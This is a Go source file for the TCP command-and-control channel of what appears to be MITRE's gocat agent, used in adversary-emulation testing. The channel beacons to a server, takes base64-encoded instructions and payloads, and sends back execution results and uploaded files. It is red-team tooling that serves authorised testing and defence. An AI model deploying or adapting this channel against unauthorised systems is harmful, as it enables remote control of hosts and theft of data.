package contact

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/mitre/gocat/output"
)

type TCP struct {
	conn                net.Conn
	name                string
	serverAddr          string
	instructionBucket   [][]byte
	payloadBucket       map[string]*payloadRecord
	outgoingBucket      [][]byte
	proxyToClientBucket [][]byte
	proxyToServerBucket [][]byte
	// payloadRequestBucket [][]byte
	// payloadBucket        map[string][]byte
}

type payloadRecord struct {
	sync.Mutex
	bytes     []byte
	waitCount int

	cond *sync.Cond
}

func newPayloadRecord() *payloadRecord {
	p := payloadRecord{}
	p.cond = sync.NewCond(&p)
	return &p
}

func init() {
	CommunicationChannels["tcp"] = &TCP{name: "TCP"}
}

func (t *TCP) C2RequirementsMet(profile map[string]interface{}, c2Config map[string]string) (bool, map[string]string) {
	// For now, we'll just try to connect once, and quit if it fails
	addrParts := strings.Split(t.serverAddr, ":")
	if len(addrParts) != 2 {
		output.VerbosePrint("[!] Error - server address not correctly formatted. Must provide as IP:PORT")
		return false, nil
	}

	t.createTCPConnection(profile)

	go t.listenAndHandleIncoming(profile)
	go t.handleOutgoing()
	go t.handleProxy()
	return true, nil

}

func (t *TCP) createTCPConnection(profile map[string]interface{}) {
	conn, err := net.Dial("tcp", t.serverAddr)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] %s", err))
	}
	t.conn = conn

	t.handshake(profile)
	output.VerbosePrint(fmt.Sprintf("[+] TCP established for %s", profile["paw"]))
}

func (t *TCP) handshake(profile map[string]interface{}) {
	/*
		Sends the initial beacon to the server after creating the connection. Retrieves a paw.
	*/
	//write the profile
	jdata, _ := json.Marshal(profile)
	t.conn.Write(jdata)
	t.conn.Write([]byte("\n"))

	//read back the paw
	data := make([]byte, 512)
	n, _ := t.conn.Read(data)
	paw := string(data[:n])
	// conn.Write([]byte("\n"))
	profile["paw"] = strings.TrimSpace(string(paw))
}

func (t *TCP) listenAndHandleIncoming(profile map[string]interface{}) {
	/*
		This function continually listens on the TCP connection for information from the server.
		When a message is received from the server, the type of message is checked, and then the contents are
		appended to the appropriate bucket.
		Currently, there are 2 types of messages: Instructions and Proxy.
	*/

	// scanner := bufio.NewScanner(t.conn)
	buf := make([]byte, 2048)
	for {
		// for scanner.Scan() {
		numBytes, err := t.conn.Read(buf)
		if err != nil {
			if err == io.EOF {
				//TCP Connection closed. We may want to handle this differently, but for now we'll just exit
				output.VerbosePrint("Connection Read returned EOF, exiting")
				os.Exit(-1)
			} else {
				output.VerbosePrint(fmt.Sprintf("Connection READ returned an error: %s", err.Error()))
			}
		}
		if numBytes != 0 {
			trimmedBuf := bytes.Trim(buf, "\x00")
			var messageWrapper map[string]interface{}
			if err := json.Unmarshal(trimmedBuf, &messageWrapper); err != nil {
				output.VerbosePrint(fmt.Sprintf("[-] Malformed TCP message received: %s", err.Error()))
			} else {
				if messageWrapper["messageType"] == "instruction" {

					decodedInstructions, err := base64.StdEncoding.DecodeString(messageWrapper["message"].(string)) //messageInstructions
					if err != nil {
						output.VerbosePrint(fmt.Sprintf("[-] Error base64 decoding instructions: %s", err.Error()))
						return
					}
					t.instructionBucket = append(t.instructionBucket, []byte(decodedInstructions))

				} else if messageWrapper["messageType"] == "proxy" {
					var messageProxy string
					if err := json.Unmarshal([]byte(messageWrapper["message"].(string)), &messageProxy); err != nil {
						output.VerbosePrint(fmt.Sprintf("[-] Malformed TCP message received in proxy: %s", err.Error()))
					}

					decodedProxy, err := base64.StdEncoding.DecodeString(messageProxy)
					if err != nil {
						output.VerbosePrint(fmt.Sprintf("[-] Error base64 decoding proxy: %s", err.Error()))
						return
					}
					t.proxyToClientBucket = append(t.proxyToClientBucket, []byte(decodedProxy))
				} else if messageWrapper["messageType"] == "payload" {
					decodedPayload, err := base64.StdEncoding.DecodeString(messageWrapper["message"].(string))
					if err != nil {
						output.VerbosePrint(fmt.Sprintf("[-] Error base64 decoding payload: %s", err.Error()))
						return
					}

					// var messagePayload string
					// if err := json.Unmarshal([]byte(messageWrapper["message"].(string)), &messagePayload); err != nil {
					// 	output.VerbosePrint(fmt.Sprintf("[-] Malformed TCP message received in payload: %s", err.Error()))
					// }

					// decodedPayload, err := base64.StdEncoding.DecodeString(messagePayload)
					// if err != nil {
					// 	output.VerbosePrint(fmt.Sprintf("[-] Error base64 decoding payload: %s", err.Error()))
					// 	return
					// }
					t.handlePayloadResponse([]byte(decodedPayload))
				} else {
					output.VerbosePrint(fmt.Sprintf("[-] TCP Message Type not recognized: %s", messageWrapper["messageType"]))
				}
			}
		}
	}
}

func (t *TCP) handlePayloadResponse(payloadMessage []byte) {
	/*
		This function processes received Payload responses. It stores the payload bytes returned into the appropriate
			payloadRec, and then broadcasts to all waiting payload requests that the payload has been retrieved.
	*/
	var payloadResponse map[string]interface{}
	if err := json.Unmarshal(payloadMessage, &payloadResponse); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Malformed TCP message received: %s", err.Error()))
	} else {
		payloadName, ok := payloadResponse["filename"]
		if !ok {
			output.VerbosePrint("[-] Payload response did not include filename")
		}
		payloadRec, ok := t.payloadBucket[payloadName.(string)]
		if !ok {
			output.VerbosePrint(fmt.Sprintf("[-] Payload returned, but no payload record for: %s", payloadName))
		}
		payloadBytes, ok := payloadResponse["bytes"]
		if !ok {
			output.VerbosePrint(fmt.Sprintf("[-] Payload response did not include file bytes for: %s", payloadName))
		}

		decodedBytes, err := base64.StdEncoding.DecodeString(payloadBytes.(string))
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Decoding payload bytes returned an error: %s", err.Error()))
		}

		payloadRec.Lock()
		payloadRec.bytes = []byte(decodedBytes)
		payloadRec.cond.Broadcast()
		payloadRec.Unlock()
	}
}

func (t *TCP) handleOutgoing() {
	/*
		This function keeps going through payloadBucket and outgoingBucket, and sends the entries in each to the server.
	*/
	for {
		for len(t.outgoingBucket) > 0 {
			response := t.outgoingBucket[0]
			t.conn.Write(response)
			if len(t.outgoingBucket) > 1 {
				t.outgoingBucket = t.outgoingBucket[1:]
			} else {
				t.outgoingBucket = t.outgoingBucket[:0]
			}
		}
	}
}

func (t *TCP) handleProxy() {

}

func (t *TCP) GetBeaconBytes(profile map[string]interface{}) []byte {
	/*
		Checks for beacon in instructionBucket.
		If there is at least one beacon, removes and returns first one
	*/
	if len(t.instructionBucket) > 0 {
		beaconBytes := t.instructionBucket[0]
		t.instructionBucket = t.instructionBucket[1:]
		return beaconBytes
	}

	return nil
}

func (t *TCP) GetPayloadBytes(profile map[string]interface{}, payload string) ([]byte, string) {
	/*
		Gets payload name and places in outgoingBucket.
		Once handleOutgoing processes payload and retrieves payload bytes into payloadBucket.
		This function returns those bytes.
		We keep track of how many instances a payload is requested, so the payload is deleted from the bucket only
			when there are no more requests for that payload.
	*/
	var payloadRec *payloadRecord
	if payloadRec, ok := t.payloadBucket[payload]; ok {
		//payload request already exists, so we'll add another consumer
		payloadRec.waitCount += 1
	} else {
		//payload request does not exist yet, we need to make a new one, and populate request fields
		payloadRec = newPayloadRecord()
		payloadRec.waitCount = 1
		t.payloadBucket = make(map[string]*payloadRecord)
		t.payloadBucket[payload] = payloadRec

		requestFields := make(map[string]interface{})
		requestFields["messageType"] = "payloadRequest"
		requestFields["payload"] = payload
		requestFields["paw"] = profile["paw"]
		requestFields["platform"] = profile["platform"]

		request, err := json.Marshal(requestFields)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Cannot send payload request. Error with profile marshal: %s", err.Error()))
		} else {
			t.outgoingBucket = append(t.outgoingBucket, request)
		}
	}

	// We need to wait until the payload is retrieved before continuing
	payloadRec = t.payloadBucket[payload]
	payloadRec.Lock()
	payloadRec.cond.Wait()
	payloadRec.Unlock()

	payloadBytes := payloadRec.bytes

	if payloadRec.waitCount == 1 {
		// we are the only request waiting for the payload, so now that we have the payload we can delete the entry
		delete(t.payloadBucket, payload)
	} else {
		payloadRec.Lock()
		// there are other requests waiting for the payload, so we'll just decrement the counter
		payloadRec.waitCount -= 1
		payloadRec.Unlock()
	}

	return payloadBytes, payload
}

func (t *TCP) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
	/*
		This function adds execution output to the outgoingBucket for handleOutgoing() to process
	*/

	resultsMessage := make(map[string]interface{})
	for k, v := range profile {
		resultsMessage[k] = v
	}

	results := make([]map[string]interface{}, 1)
	results[0] = result
	resultsMessage["results"] = results

	resultsMessageJdata, err := json.Marshal(resultsMessage)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error marshalling results: %s", err.Error()))
	}
	encodedResultsMessage := base64.StdEncoding.EncodeToString(resultsMessageJdata)

	request := make(map[string]interface{})
	request["messageType"] = "executionResults"
	request["results"] = encodedResultsMessage

	data, err := json.Marshal(request)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot send results. Error with profile marshal: %s", err.Error()))
	} else {
		t.outgoingBucket = append(t.outgoingBucket, data)
	}
}

func (t *TCP) GetName() string {
	return t.name
}

func (t *TCP) SetUpstreamDestAddr(upstreamDestAddr string) {
	t.serverAddr = upstreamDestAddr
}

func (t *TCP) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	/*
		This function generates a file upload request and appends it to outgoingBucket.
		handleOutgoing then processes the request.
	*/

	upload := make(map[string]interface{})
	upload["filename"] = uploadName
	upload["data"] = data
	uploadJdata, err := json.Marshal(upload)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error while marshalling upload data: %s", err.Error()))
	}

	encodedUploadData := base64.StdEncoding.EncodeToString(uploadJdata)

	uploadRequest := make(map[string]interface{})
	uploadRequest["messageType"] = "fileUpload"
	uploadRequest["upload"] = encodedUploadData

	request, err := json.Marshal(uploadRequest)
	if err != nil {
		return err
	} else {
		t.outgoingBucket = append(t.outgoingBucket, request)
	}
	return nil
}

func (t *TCP) SupportsContinuous() bool {
	return true
}

// func getRandomId() string {
// 	rand.Seed(time.Now().UnixNano())
// 	return strconv.Itoa(rand.Int())
// }
